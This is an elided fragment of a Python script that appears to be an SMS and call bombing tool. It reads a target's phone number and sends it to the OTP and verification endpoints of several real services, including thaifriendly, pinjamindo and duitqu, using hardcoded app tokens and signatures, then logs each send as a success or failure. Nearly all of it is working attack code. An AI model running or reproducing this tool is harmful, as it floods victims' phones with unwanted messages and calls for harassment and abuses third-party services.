...
def input():
  ...
  if len(nom) < 5:
    ...
    print "%s[%s!%s] %sMasukkan nomor tanpa 66, +66, ataupun 0\n%s[%s!%s] %sContoh : 85877166199"%(pu,me,pu,ku,pu,me,pu,ku)
    input()
  else:
    global jum
...
def datesy():
# to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'66','number':nom,'ppclienttoken':'f61667ef220c356b6bf10e28a948c5e6'})
 #if json.loads(to.text)["success"] == True:
  sukses("6","sms","datesy")
 #else:
  #gagal("6","sms","datesy")
def thaifriendly():
 tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'66','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
...
def pinjamindo():
 hu = requests.get("https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=66%s&af_id=1603255661130-6766673395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"%nom)
...
def bocil():
 ...
 if json.loads(uh)["message"] == 'ok':
  ...
  gagal("23","call","bocil")
def duitqu():
 tes = requests.get("https://appapi.duitqu.id/api/v1/custom/send_verify_code?mobile=66%s&af_id=1603327368446-6560442845592783226&app=duitqu&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=ccvIIClr0Sw&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10102&sign=1B8BE88D093027E0CD9970C48DCA3F86EDE31C08"%nom)
 sukses("24","sms","duiqu")
def primacash():
